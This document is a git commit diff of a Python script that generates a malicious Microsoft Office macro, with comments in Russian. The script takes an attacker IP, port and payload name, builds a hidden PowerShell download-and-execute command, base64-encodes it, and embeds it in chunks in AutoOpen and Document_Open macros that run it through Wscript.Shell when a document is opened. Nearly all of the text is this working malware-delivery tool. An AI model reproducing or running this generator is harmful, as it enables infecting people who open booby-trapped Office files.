c4cd02ef8b004ca3ab36b29b3f3faa81a26723b1
Sh7yk <93066307+Sh7yk@users.noreply.github.com>
2025-03-07 13:39:05 +0700

    Update downloading_macros_generator.py

--- downloading_macros_generator.py
+++ downloading_macros_generator.py
@@ -1,20 +1,30 @@
 import base64
+import argparse
 
-# PowerShell команда для скачивания файла и его запуска
-# Укажите свой IP,PORT,PAYLOAD
-payload = """
+def main():
+    parser = argparse.ArgumentParser(description='Generate malicious Office macro')
+    parser.add_argument('--ip', required=True, help='Attacker IP address')
+    parser.add_argument('--port', required=True, help='Attacker port')
+    parser.add_argument('--payload', required=True, help='Payload file name')
+    parser.add_argument('--upload-to', help='Path to save payload', default='C:\\Users\\Public\\Documents\\calc.exe')
+    
+    args = parser.parse_args()
+
+    # Формируем PowerShell команду с переданными параметрами
+    ps_command = f"""
 $client = New-Object System.Net.WebClient
-$client.DownloadFile('http://<IP>:<PORT>/<PAYLOAD>.exe', 'C:\\Users\\Public\\Documents\\calc.exe')
-Start-Process 'C:\\Users\\Public\\Documents\\calc.exe' -WindowStyle Hidden
+$client.DownloadFile('http://{args.ip}:{args.port}/{args.payload}', '{args.upload_to}')
+Start-Process '{args.upload_to}' -WindowStyle Hidden
 """
 
-# Кодирование payload в base64
-encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
-cmdline = "powershell.exe -nop -w hidden -e " + encoded_payload
-
-# Создание макроса для Microsoft Office
-macro_payload = """
-Sub AutoOpen()
+    # Кодирование payload с учетом UTF-16 Little Endian (без BOM)
+    encoded_script = base64.b64encode(ps_command.encode('utf-16le')).decode()
+    
+    # Формируем командную строку для PowerShell
+    cmdline = f"powershell.exe -nop -w hidden -e {encoded_script}"
+    
+    # Генерация макроса с правильным разбиением команды
+    macro_template = """Sub AutoOpen()
     AutoOpenMacro
 End Sub
 
@@ -23,15 +33,20 @@ Sub Document_Open()
 End Sub
 
 Sub AutoOpenMacro()
-    Dim Str as String
+    Dim Str As String
 """
-
-for i in range(0, len(cmdline), 50):
-    macro_payload = macro_payload + "    Str = Str + " + '"' + cmdline[i:i + 50] + '"\n'
-
-macro_payload = macro_payload + """
-    CreateObject("Wscript.Shell").Run Str
+    
+    # Разбиваем командную строку на части по 50 символов
+    chunks = [cmdline[i:i+50] for i in range(0, len(cmdline), 50)]
+    
+    for chunk in chunks:
+        macro_template += f'    Str = Str + "{chunk}"\n'
+    
+    macro_template += """    CreateObject("Wscript.Shell").Run Str
 End Sub
 """
 
-print(macro_payload)
+    print(macro_template)
+
+if __name__ == "__main__":
+    main()
